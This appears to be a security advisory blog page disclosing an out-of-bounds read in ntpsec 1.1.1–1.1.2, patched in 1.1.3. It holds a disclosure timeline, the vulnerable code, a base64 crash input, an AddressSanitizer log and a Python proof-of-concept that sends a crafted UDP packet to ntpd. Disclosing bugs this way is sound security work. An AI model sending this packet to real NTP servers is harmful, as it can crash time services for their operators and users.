@@ -1,0 +1,1138 @@
+<html>
+<head>
+<title>dumpco.re</title>
+<link rel="shortcut icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body style="margin-left: 40px; background-color: #000000;">
+<!-- http://patorjk.com/software/taag/#p=display&f=Rectangles&t=.%2F%20dumpcore -->
+<div id="x" style="font-family: Terminus; font-size: 14px; color: white;">
+                                  
+     _        _                   
+    / |   ___| |_ ___ ___ ___ ___ 
+ _ / /   |   |  _| . |_ -| -_|  _|
+|_|_/    |_|_|_| |  _|___|___|___|
+                 |_|              
+
+2019-01-15
+
+OUT OF BOUNDS READ IN NTPSEC
+============================
+
+This is the first of four bugs. For more visit: https://dumpco.re/blog/ntpsec-bugs
+
+An out-of-bounds read bug was found in ntpsec.
+
+Affected versions: ntpsec 1.1.1, 1.1.2
+
+Timeline:
+
+2018-10-15 Bug discovered
+2018-10-16 Bug reported
+2019-01-13 Vendor released patch version 1.1.3
+
+The bug exists in ctl_getitem. Code snippet:
+
+  2539   /* Scan the string in the packet until we hit comma or
+  2540    * EoB. Register position of first '=' on the fly. */
+  2541   for (tp = NULL, cp = reqpt; cp != reqend; ++cp) {      // <-- cp incremented out of bounds
+  2542     if (*cp == '=' && tp == NULL)                        // <-- cp dereferenced, reading uninitialised data                                                
+  2543       tp = cp;
+  2544     if (*cp == ',')
+  2545       break;
+  2546   }
+
+Crash report:
+
+  # uname -a
+  Linux h4xb0x 3.16.0-7-amd64 #1 SMP Debian 3.16.59-1 (2018-10-03) x86_64 GNU/Linux
+
+  # sha256sum ../../bug1 
+  a3e54a033eea3c3f0a5c795aaa0d8c8b3f4cbb013760e3b1865afb20eb4347b0  ../../bug1
+
+  # base64 ../../bug1
+  TgID7AAAAAAAAALHdGM9EACvLCwsLPoAAPoLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsG
+  CwvOCxQLCwsLCwsLCwsLCwsLCwshCwsLCwsLCwsLCwsLCwsLBgsLzgsLCwsLCwsLCwvk5OULCwsL
+  IAsLCwsLCws9Yz2sCwsLCy0nCwsLCwsLCwsLCwsLC4ALCwsLCwsLCwsLCwsLCwsLCwv/CwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsCCwsLCwsYCwsLCwsLCwsLCwsLAAAAAsd0Yz0QAK8sLCws
+  +gAA+gsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwYLC84LFAsLCwsLCwsLCwsLCwsLCyEL
+  CwsLCwsLCwsLCwsLCwsGCwvOCwsLCwsLCwsLC+Tk5QsLCwsgCwsLCwsLCz1jPawLCwsLLScLCwsL
+  CwsLCwsLCwsLgAsLCwsLCwsLCwsLCwsLCwsLC/8LCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwILCwsL
+  CxgLCwsLCwsLCwsLCwsLCwsLCwsLCwsOCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLSwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCzupSN0ABAsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCw4L
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwtLCwsLCwsLCwsLCwsLCwsLCwsLCwsLO6lI3QAE
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwc=
+
+  # ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer-3.5 ./build/main/ntpd/ntpd -n & sleep 1; cat ../../bug1 > /dev/udp/127.0.0.1/5123
+  2018-10-16T20:36:59 ntpd[18249]: INIT: ntpd ntpsec-1.1.2 2018-10-15T18:34:38Z: Starting
+  2018-10-16T20:36:59 ntpd[18249]: INIT: Command line: ./build/main/ntpd/ntpd -n
+  2018-10-16T20:36:59 ntpd[18249]: INIT: precision = 0.131 usec (-23)
+  2018-10-16T20:36:59 ntpd[18249]: INIT: successfully locked into RAM
+  2018-10-16T20:36:59 ntpd[18249]: CONFIG: readconfig: parsing file: /etc/ntp.conf
+  restrict 0.0.0.0: KOD does nothing without LIMITED.
+  2018-10-16T20:36:59 ntpd[18249]: CONFIG: restrict 0.0.0.0: KOD does nothing without LIMITED.
+  2018-10-16T20:36:59 ntpd[18249]: CONFIG: restrict 0.0.0.0: notrap keyword is ignored.
+  restrict ::: KOD does nothing without LIMITED.
+  2018-10-16T20:36:59 ntpd[18249]: CONFIG: restrict ::: KOD does nothing without LIMITED.
+  2018-10-16T20:36:59 ntpd[18249]: CONFIG: restrict ::: notrap keyword is ignored.
+  2018-10-16T20:36:59 ntpd[18249]: INIT: Using SO_TIMESTAMPNS
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen and drop on 0 v6wildcard [::]:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen and drop on 1 v4wildcard 0.0.0.0:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen normally on 2 lo 127.0.0.1:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen normally on 3 eth0 192.168.245.220:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen normally on 4 eth0 192.168.245.131:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen normally on 5 lo [::1]:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listen normally on 6 eth0 [fe80::50:56ff:fe38:d7b8%2]:5123
+  2018-10-16T20:36:59 ntpd[18249]: IO: Listening on routing socket on fd #23 for interface updates
+  2018-10-16T20:36:59 ntpd[18249]: statistics directory /var/NTP/ does not exist or is unwriteable, error No such file or directory
+  =================================================================
+  ==18249==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd426ef680 at pc 0x55b2240a8d45 bp 0x7ffd426ee9b0 sp 0x7ffd426ee9a8
+  READ of size 1 at 0x7ffd426ef680 thread T0
+  root@h4xb0x:/home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2#     #0 0x55b2240a8d44 in ctl_getitem /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_control.c:2542:7
+      #1 0x55b22409b636 in read_sysvars /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_control.c:2804:22
+      #2 0x55b22409b636 in read_variables /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_control.c:2866
+      #3 0x55b22409767c in process_control /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_control.c:898:4
+      #4 0x55b22406991b in receive /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_proto.c:676:3
+      #5 0x55b22408695e in mainloop /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntpd.c:982:6
+      #6 0x55b22408695e in ntpdmain /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntpd.c:911
+      #7 0x55b22408695e in main /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntpd.c:426
+      #8 0x7f5b8a657b44 in __libc_start_main /build/glibc-6V9RKT/glibc-2.19/csu/libc-start.c:287
+      #9 0x55b22403a48c in _start (/home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/ntpd/ntpd+0x10348c)
+
+  Address 0x7ffd426ef680 is located in stack of thread T0 at offset 576 in frame
+      #0 0x55b2240964bf in process_control /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_control.c:768
+
+    This frame has 1 object(s):
+      [32, 576) 'pkt_core' <== Memory access at offset 576 overflows this variable
+  HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+        (longjmp and C++ exceptions *are* supported)
+  SUMMARY: AddressSanitizer: stack-buffer-overflow /home/magnus/projects/ntpsec/untouched/ntpsec-1.1.2/build/main/../../ntpd/ntp_control.c:2542 ctl_getitem
+  Shadow bytes around the buggy address:
+    0x1000284d5e80: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00
+    0x1000284d5e90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5ea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5eb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5ec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  =>0x1000284d5ed0:[f3]f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3
+    0x1000284d5ee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5f10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x1000284d5f20: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
+  Shadow byte legend (one shadow byte represents 8 application bytes):
+    Addressable:           00
+    Partially addressable: 01 02 03 04 05 06 07 
+    Heap left redzone:       fa
+    Heap right redzone:      fb
+    Freed heap region:       fd
+    Stack left redzone:      f1
+    Stack mid redzone:       f2
+    Stack right redzone:     f3
+    Stack partial redzone:   f4
+    Stack after return:      f5
+    Stack use after scope:   f8
+    Global redzone:          f9
+    Global init order:       f6
+    Poisoned by user:        f7
+    Container overflow:      fc
+    ASan internal:           fe
+  ==18249==ABORTING
+
+The following PoC exploit can be used to demonstrate the issue:
+
+  #!/usr/bin/env python
+  import sys
+  import socket
+
+  buf = ("\x4e\x02\x03\xec\x00\x00\x00\x00\x00\x00\x02\xc7\x74\x63\x3d\x10" +
+         "\x00\xaf\x2c\x2c\x2c\x2c\xfa\x00\x00\xfa\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x06\x0b\x0b\xce\x0b\x14\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x21\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x06\x0b\x0b" +
+         "\xce\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\xe4\xe4\xe5\x0b\x0b" +
+         "\x0b\x0b\x20\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3d\x63\x3d\xac\x0b\x0b" +
+         "\x0b\x0b\x2d\x27\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x80\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\xff\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x02\x0b\x0b\x0b\x0b\x0b\x18\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x00\x00\x00\x02\xc7\x74\x63\x3d\x10\x00\xaf\x2c\x2c" +
+         "\x2c\x2c\xfa\x00\x00\xfa\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x06\x0b\x0b\xce\x0b\x14\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x21\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x06\x0b\x0b\xce\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\xe4\xe4\xe5\x0b\x0b\x0b\x0b\x20\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x3d\x63\x3d\xac\x0b\x0b\x0b\x0b\x2d\x27" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x80\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\xff\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x02\x0b\x0b\x0b\x0b\x0b\x18\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0e\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x4b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3b\xa9\x48\xdd\x00\x04\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0e\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x4b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x3b\xa9\x48\xdd\x00\x04\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" +
+         "\x0b\x07")
+
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  sock.sendto(buf, ('127.0.0.1', 123))
+
+Proof of discovery:
+
+  $ base64 bug1
+  TgID7AAAAAAAAALHdGM9EACvLCwsLPoAAPoLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsG
+  CwvOCxQLCwsLCwsLCwsLCwsLCwshCwsLCwsLCwsLCwsLCwsLBgsLzgsLCwsLCwsLCwvk5OULCwsL
+  IAsLCwsLCws9Yz2sCwsLCy0nCwsLCwsLCwsLCwsLC4ALCwsLCwsLCwsLCwsLCwsLCwv/CwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsCCwsLCwsYCwsLCwsLCwsLCwsLAAAAAsd0Yz0QAK8sLCws
+  +gAA+gsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwYLC84LFAsLCwsLCwsLCwsLCwsLCyEL
+  CwsLCwsLCwsLCwsLCwsGCwvOCwsLCwsLCwsLC+Tk5QsLCwsgCwsLCwsLCz1jPawLCwsLLScLCwsL
+  CwsLCwsLCwsLgAsLCwsLCwsLCwsLCwsLCwsLC/8LCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwILCwsL
+  CxgLCwsLCwsLCwsLCwsLCwsLCwsLCwsOCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLSwsL
+  CwsLCwsLCwsLCwsLCwsLCwsLCzupSN0ABAsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCw4L
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwtLCwsLCwsLCwsLCwsLCwsLCwsLCwsLO6lI3QAE
+  CwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwc=
+
+  $ sha256sum bug1
+  a3e54a033eea3c3f0a5c795aaa0d8c8b3f4cbb013760e3b1865afb20eb4347b0  bug1
+
+https://twitter.com/magnusstubman/status/1051893954705264641
+
+# References
+
+- ftp://ftp.ntpsec.org/pub/releases/
+- https://gitlab.com/NTPsec/ntpsec/issues/507
+
+
+
+
+
+</div>
+<script>
+/*
+ Autolinker.js
+ 1.6.0
+
+ Copyright(c) 2017 Gregory Jacobs <greg@greg-jacobs.com>
+ MIT License
+
+ https://github.com/gregjacobs/Autolinker.js
+*/
+(function(b, a) {
+  "function" === typeof define && define.amd ? define([], a) : "object" === typeof exports ? module.exports = a() : b.Autolinker = a();
+})(this, function() {
+  var b = function(a) {
+    a = a || {};
+    this.version = b.version;
+    this.urls = this.normalizeUrlsCfg(a.urls);
+    this.email = "boolean" === typeof a.email ? a.email : !0;
+    this.phone = "boolean" === typeof a.phone ? a.phone : !0;
+    this.hashtag = a.hashtag || !1;
+    this.mention = a.mention || !1;
+    this.newWindow = "boolean" === typeof a.newWindow ? a.newWindow : !0;
+    this.stripPrefix = this.normalizeStripPrefixCfg(a.stripPrefix);
+    this.stripTrailingSlash = "boolean" === typeof a.stripTrailingSlash ? a.stripTrailingSlash : !0;
+    this.decodePercentEncoding = "boolean" === typeof a.decodePercentEncoding ? a.decodePercentEncoding : !0;
+    var c = this.mention;
+    if (!1 !== c && "twitter" !== c && "instagram" !== c) {
+      throw Error("invalid `mention` cfg - see docs");
+    }
+    c = this.hashtag;
+    if (!1 !== c && "twitter" !== c && "facebook" !== c && "instagram" !== c) {
+      throw Error("invalid `hashtag` cfg - see docs");
+    }
+    this.truncate = this.normalizeTruncateCfg(a.truncate);
+    this.className = a.className || "";
+    this.replaceFn = a.replaceFn || null;
+    this.context = a.context || this;
+    this.tagBuilder = this.matchers = this.htmlParser = null;
+  };
+  b.link = function(a, c) {
+    return (new b(c)).link(a);
+  };
